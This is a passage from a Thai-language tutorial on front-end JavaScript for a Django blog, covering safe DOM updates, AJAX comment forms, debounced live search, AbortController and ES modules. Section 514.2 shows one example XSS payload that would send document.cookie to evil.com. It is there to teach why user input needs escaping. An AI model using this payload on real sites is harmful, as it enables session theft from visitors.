// blog/static/blog/js/errors.js

// แปลง error response ของ DRF ให้เป็นข้อความเดียวที่อ่านง่าย ไม่ว่าจะเป็นรูปแบบไหน
function formatApiError(errorData) {
    if (typeof errorData.detail === 'string') {
        return errorData.detail;
    }

    // Validation error: รวมทุก field error เป็นบรรทัดเดียว
    return Object.entries(errorData)
        .map(([field, messages]) => `${field}: ${messages.join(', ')}`)
        .join(' | ');
}
```

### 514.2 DOM Manipulation: `innerHTML` vs `textContent` vs `createElement` — เรื่อง XSS ที่ต้องเข้าใจ

| เทคนิค | ความเร็วในการเขียนโค้ด | ความเสี่ยง XSS | เหมาะกับ |
|---|---|---|---|
| `element.innerHTML = htmlString` | เร็วที่สุด (เขียนน้อยบรรทัด) | **สูงมาก** ถ้า `htmlString` มีข้อมูลจากผู้ใช้ที่ไม่ได้ escape | HTML ที่ควบคุมเองทั้งหมด ไม่มีข้อมูลผู้ใช้ปน |
| `element.textContent = text` | เร็ว | **ไม่มีเลย** (browser ไม่ parse เป็น HTML) | แสดงข้อความล้วน ไม่มี tag |
| `document.createElement()` + `element.textContent` | ช้ากว่า (หลายบรรทัด) | **ไม่มีเลย** | โครงสร้าง DOM ซับซ้อนที่ต้องผสมข้อมูลผู้ใช้ |
| `element.insertAdjacentHTML()` | เร็ว คล้าย `innerHTML` แต่ไม่ล้าง element เดิม | เหมือน `innerHTML` | เพิ่ม element เข้าไปโดยไม่ rebuild DOM ทั้งหมด |

**อันตรายของ `innerHTML` กับข้อมูลผู้ใช้** — ลองจินตนาการว่า comment ของผู้ใช้คนหนึ่งคือ:

```
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

ถ้าโค้ด render ด้วย `container.innerHTML = `<p>${comment.content}</p>`` ตรง ๆ โดยไม่
escape ก่อน สคริปต์อันตรายนี้จะรันทันทีในเบราว์เซอร์ของทุกคนที่เปิดหน้านั้น (ขโมย session
cookie ไปได้เลย) — **นี่คือเหตุผลที่ฟังก์ชัน `escapeHtml()` ในขั้นตอนที่ 512.4 สำคัญมาก**

```javascript
// blog/static/blog/js/dom.js

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;   // browser escape ให้เองโดยอัตโนมัติผ่านกลไกนี้
    return div.innerHTML;
}

// วิธีที่ปลอดภัยกว่าอีกขั้น: สร้าง DOM node จริง แทนการต่อสตริง HTML
function createCommentElement(comment) {
    const article = document.createElement('article');
    article.className = 'comment-card';

    const author = document.createElement('strong');
    author.textContent = comment.author;   // textContent ปลอดภัยเสมอ ไม่ต้อง escape เอง

    const content = document.createElement('p');
    content.textContent = comment.content;

    article.append(author, content);
    return article;
}
```

**คำแนะนำระดับมืออาชีพ**: ใช้ `createElement()` + `textContent` เสมอเมื่อข้อมูลมาจากผู้ใช้
(comment, title ที่ผู้ใช้พิมพ์เอง) ใช้ `innerHTML`/template literal ได้เมื่อ HTML นั้นเรา
ควบคุมโครงสร้างเองทั้งหมดและข้อมูลผู้ใช้ผ่าน `escapeHtml()` มาก่อนเสมอ

### 514.3 อัปเดต DOM แบบไดนามิกโดยไม่ reload หน้า: ตัวอย่าง Publish/Unpublish

ทบทวนจาก Part 044 ขั้นตอนที่ 434.2: `PostViewSet` มี custom action `@action(detail=True)`
ชื่อ `publish`/`unpublish` อยู่แล้ว มาเชื่อมปุ่มในหน้าเว็บเข้ากับ action เหล่านี้:

```html
<!-- blog/templates/blog/post_detail.html (เพิ่มจากขั้นตอนที่ 511.6) -->
<div class="publish-control" data-slug="{{ post.slug }}">
    <span id="publish-status" class="badge {% if post.is_published %}badge--published{% else %}badge--draft{% endif %}">
        {% if post.is_published %}เผยแพร่แล้ว{% else %}ฉบับร่าง{% endif %}
    </span>
    <button id="toggle-publish-btn" type="button">
        {% if post.is_published %}ยกเลิกเผยแพร่{% else %}เผยแพร่เลย{% endif %}
    </button>
</div>
```

```javascript
// blog/static/blog/js/publish-toggle.js
const control = document.querySelector('.publish-control');

if (control) {
    const slug = control.dataset.slug;
    const statusBadge = document.getElementById('publish-status');
    const toggleButton = document.getElementById('toggle-publish-btn');

    toggleButton.addEventListener('click', async () => {
        // อ่านสถานะปัจจุบันจาก DOM เพื่อตัดสินใจว่าจะเรียก publish หรือ unpublish action
        const isCurrentlyPublished = statusBadge.classList.contains('badge--published');
        const action = isCurrentlyPublished ? 'unpublish' : 'publish';

        toggleButton.disabled = true;

        try {
            const response = await apiFetch(`/api/posts/${slug}/${action}/`, {
                method: 'POST',
            });

            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(formatApiError(errorData));
            }

            const updatedPost = await response.json();

            // อัปเดต DOM ทันที โดยไม่ reload หน้าเว็บเลย — นี่คือหัวใจของขั้นตอนนี้
            if (updatedPost.is_published) {
                statusBadge.textContent = 'เผยแพร่แล้ว';
                statusBadge.classList.replace('badge--draft', 'badge--published');
                toggleButton.textContent = 'ยกเลิกเผยแพร่';
            } else {
                statusBadge.textContent = 'ฉบับร่าง';
                statusBadge.classList.replace('badge--published', 'badge--draft');
                toggleButton.textContent = 'เผยแพร่เลย';
            }
        } catch (error) {
            alert(`เกิดข้อผิดพลาด: ${error.message}`);
        } finally {
            toggleButton.disabled = false;
        }
    });
}
```

```css
/* เพิ่มใน blog/static/blog/css/blog.css (ต่อยอดจาก Part 009) */
.badge {
    display: inline-block;
    padding: 0.25rem 0.75rem;
    border-radius: 999px;
    font-size: 0.85rem;
    font-weight: 600;
}

.badge--published {
    background-color: #d4edda;
    color: #155724;
}

.badge--draft {
    background-color: #fff3cd;
    color: #856404;
}
```

สังเกตว่าผู้ใช้กดปุ่มครั้งเดียว ได้เห็นสถานะเปลี่ยนทันทีโดย **ไม่มีการกระพริบหน้าเว็บเลย**
(ไม่มี full page reload) — นี่คือประสบการณ์ผู้ใช้ (UX) ที่ดีกว่ามากเมื่อเทียบกับการ submit
ฟอร์ม HTML ปกติที่ต้อง reload ทุกครั้ง (แบบที่เรียนใน Part 023-025)

### 514.4 ตารางสรุปแนวทางอัปเดต DOM ตามสถานการณ์

| สถานการณ์ | เทคนิคที่แนะนำ |
|---|---|
| เปลี่ยนข้อความ/class ของ element เดิมที่มีอยู่แล้ว (เช่น badge สถานะ) | เข้าถึง element ตรง ๆ ด้วย `getElementById`/`querySelector` แล้วแก้ property |
| แสดงรายการใหม่ทั้งหมด (เช่น ผลค้นหาใหม่) | ล้าง container ด้วย `innerHTML = ''` แล้วสร้างใหม่ทั้งหมด |
| เพิ่ม item ใหม่ 1 รายการเข้าไปในรายการเดิม (เช่น comment ใหม่ที่เพิ่งโพสต์) | `container.appendChild(newElement)` หรือ `insertAdjacentElement` — ไม่ต้อง rebuild ทั้งหมด |
| ลบ item ออกจากรายการ | `element.remove()` |

---

## ขั้นตอนที่ 515: ส่งฟอร์มผ่าน AJAX โดยไม่ reload หน้า (submit comment แบบ async)

### 515.1 ทบทวนพฤติกรรมปกติของ `<form>` HTML

ทบทวนจาก Part 025: เมื่อผู้ใช้กด submit ฟอร์ม HTML ธรรมดา เบราว์เซอร์จะ:

1. รวบรวมค่าจากทุก input ในฟอร์ม
2. ส่ง HTTP request ไปยัง URL ใน attribute `action` (method ตาม attribute `method`)
3. **reload หน้าทั้งหมด** ด้วย response ที่ได้กลับมา (ไม่ว่า response จะเป็น HTML หน้าใหม่
   หรือ JSON ก็ตาม — เบราว์เซอร์จะแสดง JSON ดิบ ๆ เต็มหน้าจอถ้า response เป็น JSON)

พฤติกรรมข้อ 3 นี้แหละที่เราต้องการ "ยกเลิก" เพื่อทำ AJAX form submission

### 515.2 Intercept การ Submit ด้วย `preventDefault()`

```javascript
form.addEventListener('submit', (event) => {
    event.preventDefault();   // หยุดพฤติกรรม default ของเบราว์เซอร์ (ข้อ 2-3 ด้านบน)
    // จากนี้ไป เราควบคุมทุกอย่างเองผ่าน fetch()
});
```

`event.preventDefault()` **ต้องเรียกก่อนเสมอ** (หรืออย่างน้อยเรียกก่อนที่ event loop จะ
ประมวลผล submit event เสร็จ) มิเช่นนั้นเบราว์เซอร์จะ submit ฟอร์มไปพร้อมกับที่โค้ด JS ของเรา
ก็ยิง `fetch()` ไปด้วย กลายเป็นสองคำขอซ้อนกัน

### 515.3 สร้างฟอร์ม Comment ที่เชื่อมกับ Nested Router จาก Part 044/435

ทบทวน endpoint: `POST /api/posts/{post_pk}/comments/` (Nested Router, Part 044 ขั้นตอนที่
435) สร้าง comment ผูกกับ post โดยอัตโนมัติจาก URL

```html
<!-- blog/templates/blog/post_detail.html (เพิ่มต่อจากขั้นตอนที่ 514.3) -->
<section class="comment-section" data-post-id="{{ post.id }}">
    <h2>ความคิดเห็น</h2>
    <div id="comment-list"></div>

    {% if request.user.is_authenticated %}
        {% csrf_token %}
        <form id="comment-form">
            <textarea id="comment-content" name="content" rows="3"
                      placeholder="แสดงความคิดเห็น..." required></textarea>
            <button type="submit">ส่งความคิดเห็น</button>
            <p id="comment-error" class="error-message" hidden></p>
        </form>
    {% else %}
        <p><a href="{% url 'login' %}">เข้าสู่ระบบ</a> เพื่อแสดงความคิดเห็น</p>
    {% endif %}
</section>
```

```javascript
// blog/static/blog/js/comments.js
const commentSection = document.querySelector('.comment-section');

if (commentSection) {
    const postId = commentSection.dataset.postId;
    const commentList = document.getElementById('comment-list');
    const form = document.getElementById('comment-form');

    async function loadComments() {
        const response = await apiFetch(`/api/posts/${postId}/comments/`);
        const payload = await response.json();
        const comments = payload.data || payload;   // เผื่อ endpoint ยังไม่เปิด pagination

        commentList.innerHTML = '';
        comments.forEach((comment) => {
            commentList.appendChild(createCommentElement(comment));
        });
    }

    if (form) {
        form.addEventListener('submit', async (event) => {
            event.preventDefault();

            const submitButton = form.querySelector('button[type="submit"]');
            const errorBox = document.getElementById('comment-error');
            const textarea = document.getElementById('comment-content');

            errorBox.hidden = true;
            submitButton.disabled = true;   // ป้องกัน double submit (515.5)
            submitButton.textContent = 'กำลังส่ง...';

            try {
                const response = await apiFetch(`/api/posts/${postId}/comments/`, {
                    method: 'POST',
                    body: JSON.stringify({ content: textarea.value }),
                });

                if (!response.ok) {
                    const errorData = await response.json();
                    throw new Error(formatApiError(errorData));
                }

                const newComment = await response.json();

                // เพิ่ม comment ใหม่เข้าไปในรายการทันที ไม่ต้อง fetch ใหม่ทั้งหมด
                commentList.appendChild(createCommentElement(newComment));
                textarea.value = '';   // ล้างฟอร์มหลังส่งสำเร็จ
            } catch (error) {
                errorBox.textContent = error.message;
                errorBox.hidden = false;
            } finally {
                submitButton.disabled = false;
                submitButton.textContent = 'ส่งความคิดเห็น';
            }
        });
    }

    loadComments();
}
```

### 515.4 แสดง Validation Error รายฟิลด์ให้ละเอียดขึ้น

ตัวอย่างข้างบนรวม error ทุก field เป็นข้อความเดียว (`formatApiError`) ซึ่งใช้งานได้ แต่ถ้า
ต้องการแสดง error **ใต้ field ที่ผิดโดยตรง** (UX ที่ดีกว่า) ทำได้ดังนี้:

```javascript
function displayFieldErrors(form, errorData) {
    // ล้าง error เก่าทั้งหมดก่อน
    form.querySelectorAll('.field-error').forEach((el) => el.remove());

    Object.entries(errorData).forEach(([fieldName, messages]) => {
        if (fieldName === 'detail') return;   // ข้าม error ที่ไม่ผูกกับ field ไหน

        const field = form.querySelector(`[name="${fieldName}"]`);
        if (!field) return;

        const errorEl = document.createElement('p');
        errorEl.className = 'field-error';
        errorEl.textContent = Array.isArray(messages) ? messages.join(', ') : messages;
        field.insertAdjacentElement('afterend', errorEl);
    });
}
```

### 515.5 ทำไมต้อง Disable ปุ่ม Submit ระหว่างรอ Response

ถ้าไม่ disable ปุ่ม ผู้ใช้ที่ใจร้อน (หรือเน็ตช้า) อาจกด submit ซ้ำหลายครั้งก่อน response
แรกจะกลับมา ทำให้เกิด **comment ซ้ำหลายอัน** ในฐานข้อมูล — ปัญหานี้เรียกว่า **double
submission** และเป็นบั๊กที่พบบ่อยมากในระบบที่ไม่ป้องกันไว้ การ `disabled = true` ทันทีที่เริ่ม
ส่ง request แล้วค่อย `disabled = false` ใน `finally` block (รับประกันว่าทำงานไม่ว่า
success หรือ error) คือวิธีป้องกันที่ตรงไปตรงมาที่สุดฝั่ง client

**หมายเหตุระดับมืออาชีพ**: การป้องกันฝั่ง client เพียงอย่างเดียวไม่เพียงพอสำหรับระบบที่
ต้องการความถูกต้องแบบเข้มงวด (เช่น ระบบชำระเงิน) เพราะผู้ใช้สามารถยิง request ซ้ำผ่าน
`curl` ตรง ๆ โดยไม่ผ่านปุ่มได้เสมอ — การป้องกันที่แท้จริงต้องอยู่ฝั่ง backend ด้วย (เช่น
idempotency key) ซึ่งเป็นหัวข้อขั้นสูงที่จะกล่าวถึงใน Phase 9 (System Design)

---

## ขั้นตอนที่ 516: Debounce การพิมพ์ค้นหาแบบ live search ที่ยิง API ทุกครั้งที่พิมพ์

### 516.1 ปัญหา: ยิง API ทุก Keystroke

ถ้าเขียนโค้ดแบบไร้เดียงสาที่สุดสำหรับช่องค้นหาแบบ real-time:

```javascript
// ตัวอย่างที่ไม่ควรทำ — ยิง API ทุกครั้งที่พิมพ์ตัวอักษร
searchInput.addEventListener('input', async (event) => {
    const response = await apiFetch(`/api/posts/?search=${event.target.value}`);
    // ...
});
```

ถ้าผู้ใช้พิมพ์คำว่า `"django orm"` (11 ตัวอักษรรวมช่องว่าง) โค้ดนี้จะยิง **11 requests**
ไปยัง server ในเวลาไม่ถึงวินาที! ปัญหาที่ตามมา:

- **สิ้นเปลืองทรัพยากร server** อย่างมาก (แต่ละ request ต้อง query database)
- **Race Condition**: response ของคำค้นหาเก่า (เช่น `"djang"`) อาจมาถึง **หลัง** response
  ของคำค้นหาใหม่กว่า (`"django orm"`) เพราะ network latency ไม่แน่นอน ทำให้ผลลัพธ์ที่แสดง
  บนหน้าจอผิดเพี้ยนไปจากคำที่ผู้ใช้พิมพ์ล่าสุดจริง ๆ (จะแก้ปัญหานี้ในขั้นตอนที่ 516.4)
- **UX แย่**: อาจเห็นผลลัพธ์กระพริบเปลี่ยนไปมาเร็วเกินไปจนตามไม่ทัน

### 516.2 เขียนฟังก์ชัน `debounce()` เอง

**Debounce** คือเทคนิคที่ทำให้ฟังก์ชันหนึ่ง ๆ ทำงาน **หลังจากที่ event หยุดเกิดขึ้นไปแล้ว
ตามระยะเวลาที่กำหนด** เท่านั้น — ถ้า event เกิดซ้ำอีกก่อนครบเวลา จะรีเซ็ตตัวจับเวลาใหม่

```javascript
// blog/static/blog/js/debounce.js

/**
 * debounce(fn, delayMs) คืนฟังก์ชันใหม่ที่หน่วงเวลาการเรียก fn จริง
 * จนกว่าจะไม่มีการเรียกซ้ำภายในระยะเวลา delayMs
 *
 * ตัวอย่าง: debounce(search, 300) หมายความว่า
 * ถ้าผู้ใช้พิมพ์ติดกันเร็วกว่าทุก 300ms การค้นหาจะยังไม่เกิดขึ้น
 * จะเกิดขึ้นก็ต่อเมื่อผู้ใช้ "หยุดพิมพ์" ไปแล้วอย่างน้อย 300ms
 */
function debounce(fn, delayMs) {
    let timeoutId;

    return function debounced(...args) {
        clearTimeout(timeoutId);   // ยกเลิกตัวจับเวลาเดิม (ถ้ามี)
        timeoutId = setTimeout(() => fn.apply(this, args), delayMs);
    };
}
```

แผนภาพเวลาอธิบายกลไก (สมมติ `delayMs = 300`):

```
เวลา (ms):  0    100   200   300   400   500        800
ผู้ใช้พิมพ์:  d    j     a     n     g     o          (หยุดพิมพ์)
                                                        │
                                                        ▼
                                          ครบ 300ms หลังพิมพ์ตัวสุดท้าย (500+300=800)
                                          → เรียก fn('django') เพียงครั้งเดียว!
```

ตัวอักษรระหว่างทาง (`d`, `dj`, `dja`, ...) **ไม่มีตัวไหนถูกยิง API เลย** เพราะทุกครั้งที่
พิมพ์ตัวใหม่ ตัวจับเวลาของตัวก่อนหน้าจะถูก `clearTimeout()` ทิ้งไปเสมอ

### 516.3 ผูก `debounce` เข้ากับ Input Event

```javascript
// blog/static/blog/js/search.js
const searchInput = document.getElementById('search-input');
const resultsContainer = document.getElementById('search-results');

async function performSearch(query) {
    if (!query.trim()) {
        resultsContainer.innerHTML = '';
        return;
    }

    const response = await apiFetch(`/api/posts/?search=${encodeURIComponent(query)}`);
    const payload = await response.json();

    resultsContainer.innerHTML = '';
    payload.data.forEach((post) => {
        resultsContainer.appendChild(createSearchResultElement(post));
    });
}

function createSearchResultElement(post) {
    const item = document.createElement('a');
    item.href = `/posts/${post.slug}/`;
    item.className = 'search-result-item';
    item.textContent = post.title;
    return item;
}

// สร้างเวอร์ชัน debounced ของ performSearch (หน่วง 300ms — ค่าที่นิยมใช้จริง)
const debouncedSearch = debounce((query) => performSearch(query), 300);

searchInput.addEventListener('input', (event) => {
    debouncedSearch(event.target.value);
});
```

**ทำไมเลือก 300ms**: จากงานวิจัยด้าน UX (Nielsen Norman Group และแหล่งอื่น) มนุษย์รับรู้ว่า
ระบบ "ตอบสนองทันที" ถ้า delay น้อยกว่า ~100ms และยังรู้สึก "ลื่นไหล" ถ้าไม่เกิน ~300-400ms
ค่า 300ms จึงเป็นจุดสมดุลที่ดีระหว่างการลดจำนวน request กับความรู้สึกตอบสนองทันทีของผู้ใช้
— บางระบบใช้ 200ms (ตอบสนองไวกว่า แต่ลด request น้อยกว่า) หรือ 500ms (ลด request ได้มากกว่า
แต่รู้สึกหน่วงขึ้นเล็กน้อย) ปรับได้ตามความเหมาะสมของแต่ละฟีเจอร์

### 516.4 ปัญหา Race Condition และวิธีแก้ด้วย `AbortController`

แม้จะมี debounce แล้ว **race condition ยังเกิดขึ้นได้** ในกรณีที่ผู้ใช้ค้นหาคำหนึ่ง แล้ว
รอ 300ms ให้ debounce ยิง request ออกไป จากนั้นพิมพ์คำใหม่ต่อทันที (รอบ debounce ใหม่ยิง
request ที่สองออกไปด้วย) — ถ้า network latency ของ request แรกช้ากว่า request ที่สอง
(เช่น server กำลังโหลดสูง) **response ของคำค้นหาเก่าอาจมาถึงทีหลัง** แล้วเขียนทับผลลัพธ์ที่
ถูกต้องของคำค้นหาใหม่

**`AbortController`** คือ Web API มาตรฐานที่ใช้ยกเลิก `fetch()` ที่ยังค้างอยู่:

```javascript
// blog/static/blog/js/search.js (เวอร์ชันแก้ไข ป้องกัน race condition)

let currentSearchController = null;

async function performSearch(query) {
    // ยกเลิก request ก่อนหน้าที่ยังค้างอยู่ (ถ้ามี) ก่อนเริ่ม request ใหม่เสมอ
    if (currentSearchController) {
        currentSearchController.abort();
    }

    if (!query.trim()) {
        resultsContainer.innerHTML = '';
        return;
    }

    currentSearchController = new AbortController();

    try {
        const response = await apiFetch(`/api/posts/?search=${encodeURIComponent(query)}`, {
            signal: currentSearchController.signal,
        });
        const payload = await response.json();

        resultsContainer.innerHTML = '';
        payload.data.forEach((post) => {
            resultsContainer.appendChild(createSearchResultElement(post));
        });
    } catch (error) {
        // request ที่ถูก abort() จะ throw DOMException ชื่อ 'AbortError'
        // เป็นพฤติกรรมที่ "ตั้งใจ" ไม่ใช่ error จริง จึงไม่ต้องแสดงข้อความอะไร
        if (error.name !== 'AbortError') {
            console.error('ค้นหาล้มเหลว:', error);
        }
    }
}
```

**อัปเดต `apiFetch()` ให้รองรับ `signal`**:

```javascript
// blog/static/blog/js/api.js (แก้ไขเพิ่ม signal)
async function apiFetch(url, options = {}) {
    const method = (options.method || 'GET').toUpperCase();
    const headers = {
        'Content-Type': 'application/json',
        ...options.headers,
    };

    if (!isCsrfSafeMethod(method)) {
        headers['X-CSRFToken'] = getCookie('csrftoken');
    }

    return fetch(url, {
        ...options,
        method,
        headers,
        credentials: 'same-origin',
        signal: options.signal,   // ส่งต่อ AbortSignal ถ้ามีการระบุมา
    });
}
```

ตอนนี้ไม่ว่าผู้ใช้จะพิมพ์เร็วแค่ไหน ระบบจะแสดงผลลัพธ์ของ**คำค้นหาล่าสุดเสมอ** เพราะ request
เก่าที่ยังไม่ทันตอบกลับจะถูกยกเลิกทันทีที่มีการค้นหาใหม่เกิดขึ้น

### 516.5 ตารางสรุปสิ่งที่ Live Search ต้องมีครบทั้งหมด

| องค์ประกอบ | ปัญหาที่แก้ | เทคนิค |
|---|---|---|
| Debounce | ยิง API ทุก keystroke สิ้นเปลือง | `setTimeout` + `clearTimeout` (516.2) |
| AbortController | Race condition ระหว่าง response เก่า/ใหม่ | `AbortController.abort()` + เช็ค `error.name === 'AbortError'` (516.4) |
| `encodeURIComponent()` | คำค้นหาที่มีอักขระพิเศษ (`&`, `#`, ช่องว่าง) ทำให้ URL query string ผิดรูปแบบ | ครอบค่าที่ใส่ใน query string ด้วยฟังก์ชันนี้เสมอ |
| Loading/Error state | ผู้ใช้ไม่รู้ว่าระบบกำลังทำงานอยู่หรือพัง | เจาะลึกเต็มรูปแบบในขั้นตอนที่ 517 |

---

## ขั้นตอนที่ 517: จัดการ Loading state และ Error handling ใน JS (แสดง spinner, error message)

### 517.1 UI State Machine: 4 สถานะที่ทุกฟีเจอร์แบบ Async ต้องมี

ทุกครั้งที่ UI รอผลลัพธ์จาก network request ควรมีสถานะที่ชัดเจน 4 แบบเสมอ:

```
        เริ่มพิมพ์/กดปุ่ม            สำเร็จ
  ┌─────────┐  ──────────>  ┌─────────┐  ──────────>  ┌─────────┐
  │  IDLE   │                │ LOADING │                │ SUCCESS │
  └─────────┘                └─────────┘                └─────────┘
       ▲                          │
       │                          │ ล้มเหลว
       │        ลองใหม่           ▼
       └──────────────────  ┌─────────┐
                             │  ERROR  │
                             └─────────┘
```

| สถานะ | สิ่งที่ผู้ใช้ควรเห็น |
|---|---|
| `idle` | UI ปกติ ยังไม่มีการกระทำใด ๆ |
| `loading` | Spinner หรือ skeleton, ปุ่มที่กดถูก disable |
| `success` | ผลลัพธ์แสดงผลปกติ |
| `error` | ข้อความ error ที่อ่านเข้าใจง่าย พร้อมปุ่ม "ลองใหม่" ถ้าเหมาะสม |

### 517.2 CSS Spinner แบบง่ายที่ใช้งานได้จริง

```css
/* เพิ่มใน blog/static/blog/css/blog.css */
.spinner {
    display: inline-block;
    width: 1.25rem;
    height: 1.25rem;
    border: 3px solid #e2e2e2;
    border-top-color: #1a1a2e;
    border-radius: 50%;
    animation: spin 0.6s linear infinite;
}

@keyframes spin {
    to {
        transform: rotate(360deg);
    }
}

.search-status {
    min-height: 1.5rem;
    margin-top: 0.5rem;
}

.error-message {
    color: #a94442;
    background-color: #f2dede;
    border: 1px solid #ebccd1;
    border-radius: 4px;
    padding: 0.5rem 0.75rem;
    margin-top: 0.5rem;
}

.retry-button {
    margin-left: 0.5rem;
    text-decoration: underline;
    background: none;
    border: none;
    color: #a94442;
    cursor: pointer;
}
```

### 517.3 เขียนฟังก์ชันจัดการ UI State แยกออกมาเป็นระบบ

```javascript
// blog/static/blog/js/ui-state.js

function setLoadingState(statusEl, isLoading) {
    if (isLoading) {
        statusEl.innerHTML = '<span class="spinner" aria-label="กำลังโหลด"></span> กำลังค้นหา...';
    } else {
        statusEl.innerHTML = '';
    }
}

function setErrorState(statusEl, message, onRetry) {
    statusEl.innerHTML = '';

    const errorText = document.createElement('span');
    errorText.className = 'error-message';
    errorText.textContent = message;
    statusEl.appendChild(errorText);

    if (onRetry) {
        const retryButton = document.createElement('button');
        retryButton.className = 'retry-button';
        retryButton.type = 'button';
        retryButton.textContent = 'ลองใหม่';
        retryButton.addEventListener('click', onRetry);
        statusEl.appendChild(retryButton);
    }
}

function clearState(statusEl) {
    statusEl.innerHTML = '';
}
```

### 517.4 ผสาน Loading/Error State เข้ากับ Live Search จากขั้นตอนที่ 516

```javascript
// blog/static/blog/js/search.js (เวอร์ชันสมบูรณ์ พร้อม loading/error state ครบ)

const searchInput = document.getElementById('search-input');
const resultsContainer = document.getElementById('search-results');
const statusEl = document.getElementById('search-status');

let currentSearchController = null;
let lastQuery = '';

async function performSearch(query) {
    lastQuery = query;

    if (currentSearchController) {
        currentSearchController.abort();
    }

    if (!query.trim()) {
        resultsContainer.innerHTML = '';
        clearState(statusEl);
        return;
    }

    currentSearchController = new AbortController();
    setLoadingState(statusEl, true);

    try {
        const response = await apiFetch(
            `/api/posts/?search=${encodeURIComponent(query)}`,
            { signal: currentSearchController.signal }
        );

        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(formatApiError(errorData));
        }

        const payload = await response.json();

        resultsContainer.innerHTML = '';
        if (payload.data.length === 0) {
            resultsContainer.innerHTML = '<p class="no-results">ไม่พบบทความที่ตรงกับคำค้นหา</p>';
        } else {
            payload.data.forEach((post) => {
                resultsContainer.appendChild(createSearchResultElement(post));
            });
        }

        clearState(statusEl);
    } catch (error) {
        if (error.name === 'AbortError') {
            return;   // ถูกยกเลิกโดยการค้นหาใหม่ ไม่ใช่ error จริง — เงียบไว้
        }

        setErrorState(statusEl, `ค้นหาล้มเหลว: ${error.message}`, () => performSearch(lastQuery));
    }
}

const debouncedSearch = debounce(performSearch, 300);

searchInput.addEventListener('input', (event) => {
    debouncedSearch(event.target.value);
});
```

```html
<!-- ส่วนของ template ที่เกี่ยวข้อง -->
<div class="live-search">
    <input type="search" id="search-input" placeholder="ค้นหาบทความ..." autocomplete="off">
    <div id="search-status" class="search-status"></div>
    <div id="search-results"></div>
</div>
```

ตอนนี้ผู้ใช้จะเห็น spinner ระหว่างรอผล เห็นข้อความชัดเจนถ้า server ล่ม (ลองปิด Django
development server ชั่วคราวเพื่อทดสอบ) พร้อมปุ่ม "ลองใหม่" ที่เรียกค้นหาคำเดิมซ้ำได้ทันที
โดยไม่ต้องพิมพ์ใหม่

### 517.5 `try/catch/finally` — รูปแบบที่ควรใช้เป็นมาตรฐานทุกจุดที่เรียก `fetch()`

```javascript
async function genericAsyncPattern() {
    setLoadingState(statusEl, true);   // เริ่มก่อนเสมอ

    try {
        const response = await apiFetch('/api/some-endpoint/');
        if (!response.ok) {
            throw new Error('เกิดข้อผิดพลาดจาก server');
        }
        // ... ประมวลผลข้อมูลสำเร็จ
    } catch (error) {
        setErrorState(statusEl, error.message);
    } finally {
        // finally ทำงานเสมอ ไม่ว่า try จะสำเร็จหรือ catch จะดักได้
        // เหมาะสำหรับ cleanup ที่ต้องเกิดขึ้นทุกกรณี เช่น เปิดปุ่มกลับมาใช้งานได้
        setLoadingState(statusEl, false);
    }
}
```

จำรูปแบบนี้ไว้เป็นแม่แบบมาตรฐาน — จะใช้ซ้ำในทุกฟีเจอร์ async ตลอดทั้ง Part ที่เหลือของ
หลักสูตร (Part 053-058)

---

## ขั้นตอนที่ 518: การจัดระเบียบโค้ด JavaScript (แยกเป็น module, หลีกเลี่ยง inline script ปนใน template)

### 518.1 ปัญหาของไฟล์ JS ก้อนเดียวที่บวมขึ้นเรื่อย ๆ

ถ้าเดินหน้าต่อแบบเดิม ไฟล์อย่าง `blog.js` จะบวมขึ้นเรื่อย ๆ จนกลายเป็นไฟล์เดียวหลายพัน
บรรทัดที่รวมทุกอย่างปนกัน (fetch helper, DOM helper, comment logic, search logic,
publish-toggle logic) ทำให้:

- หา logic ที่ต้องการแก้ไขยาก
- ฟังก์ชันชื่อซ้ำกันโดยไม่ตั้งใจ (global namespace ปนกันหมด)
- Test แยกส่วนไม่ได้ (Part 059-065 จะพูดเรื่อง testing JS เพิ่มเติม)
- ทีมที่ทำงานพร้อมกันหลายคน มักแก้ไฟล์เดียวกัน เกิด merge conflict บ่อย

### 518.2 ES Modules: มาตรฐานของ JavaScript สมัยใหม่

**ES Modules** (`import`/`export`) เป็นระบบ module มาตรฐานของ JavaScript ที่เบราว์เซอร์
สมัยใหม่ทุกตัวรองรับโดยตรง โดยไม่ต้องพึ่ง build tool ใด ๆ เลย เปิดใช้งานด้วยการเพิ่ม
`type="module"` ใน `<script>` tag:

```html
<script type="module" src="{% static 'blog/js/main.js' %}"></script>
```

**คุณสมบัติพิเศษของ `type="module"`**:

- **มี `defer` ในตัวโดยอัตโนมัติ** (ไม่ต้องเขียน `defer` ซ้ำ)
- แต่ละไฟล์มี **scope ของตัวเอง** ตัวแปร/ฟังก์ชันที่ไม่ได้ `export` จะไม่หลุดไปปนกับไฟล์อื่น
  (แก้ปัญหา global namespace pollution จากขั้นตอนที่ 518.1 โดยอัตโนมัติ)
- ต้องรันผ่าน HTTP server จริงเท่านั้น (`http://` หรือ `https://`) เปิดไฟล์ตรง ๆ ด้วย
  `file://` จะติด CORS error — ไม่ใช่ปัญหาสำหรับเราเพราะรันผ่าน Django `runserver` อยู่แล้ว

### 518.3 แยกโค้ดที่เขียนมาทั้ง Part นี้ ให้เป็นโครงสร้าง Module

```
blog/static/blog/js/
├── modules/
│   ├── csrf.js            (getCookie, isCsrfSafeMethod)
│   ├── api.js              (apiFetch)
│   ├── dom.js               (escapeHtml, createCommentElement)
│   ├── errors.js            (formatApiError, displayFieldErrors)
│   ├── debounce.js           (debounce)
│   ├── ui-state.js            (setLoadingState, setErrorState, clearState)
│   ├── search.js               (Live Search feature)
│   └── comments.js              (Comment form feature)
└── main.js                        (entry point — import ทุกอย่างที่ต้องใช้)
```

```javascript
// blog/static/blog/js/modules/csrf.js
export function getCookie(name) {
    const cookieValue = document.cookie
        .split('; ')
        .find((row) => row.startsWith(`${name}=`));
    return cookieValue ? decodeURIComponent(cookieValue.split('=')[1]) : null;
}

const CSRF_SAFE_METHODS = ['GET', 'HEAD', 'OPTIONS', 'TRACE'];

export function isCsrfSafeMethod(method) {
    return CSRF_SAFE_METHODS.includes(method.toUpperCase());
}
```

```javascript
// blog/static/blog/js/modules/api.js
import { getCookie, isCsrfSafeMethod } from './csrf.js';

export async function apiFetch(url, options = {}) {
    const method = (options.method || 'GET').toUpperCase();
    const headers = {
        'Content-Type': 'application/json',
        ...options.headers,
    };

    if (!isCsrfSafeMethod(method)) {
        headers['X-CSRFToken'] = getCookie('csrftoken');
    }

    return fetch(url, {
        ...options,
        method,
        headers,
